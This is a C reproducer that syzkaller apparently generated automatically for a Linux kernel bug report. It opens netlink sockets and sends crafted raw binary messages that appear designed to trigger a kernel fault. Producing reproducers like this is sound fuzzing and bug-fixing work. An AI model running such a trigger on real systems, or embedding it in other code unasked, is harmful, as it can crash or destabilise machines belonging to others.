// https://syzkaller.appspot.com/bug?id=a3cc92fe3fe3bf47b6ab9f5c840d43a2aa24ccc9
// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdint.h>
#include <string.h>

long r[3];
void loop()
{
  memset(r, -1, sizeof(r));
  syscall(__NR_mmap, 0x20000000, 0xfff000, 0x3, 0x32, 0xffffffff, 0x0);
  r[0] = syscall(__NR_socket, 0x10, 0x3, 0x0);
  r[1] = syscall(__NR_dup, r[0]);
  memcpy((void*)0x20ef4000, "\x24\x00\x00\x00\x58\x00\x1f\x00\x14\xf9"
                            "\xf4\x07\x00\x23\x04\x00\x0a\xff\xf5\x11"
                            "\x08\x00\x01\x00\xfe\xbf\xff\xff\x08\x00"
                            "\x02\x00\x01\x00\x00\x00",
         36);
  syscall(__NR_write, r[1], 0x20ef4000, 0x24);
  r[2] = syscall(__NR_socket, 0x10, 0x2, 0x0);
  memcpy((void*)0x2000ffab,
         "\x32\x00\x00\x00\x12\x00\x25\xe7\x00\x00\x07\x94\x0d\x09\x14"
         "\x04\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x83\x28"
         "\x56\x41\x12\x00\x2e\x00\x00\x00\x00\x00\xfc\x08\x08\x00\x42"
         "\xeb\x4e\x05\xd7\x92\x78\xc3\x37\xd6\x84\x56\xf2\xc4\xde\x5a"
         "\xcc\xf8\x5c\xd2\xaa\xc4\x35\xf0\xda\x01\xf9\xba\x30\x89\xa8"
         "\xc1\xb5\xfd\xe9\x95\xa1\x01\x11\x0d\xc2",
         85);
  syscall(__NR_sendto, r[2], 0x2000ffab, 0x55, 0x0, 0x20000000, 0x0);
}

int main()
{
  loop();
  return 0;
}
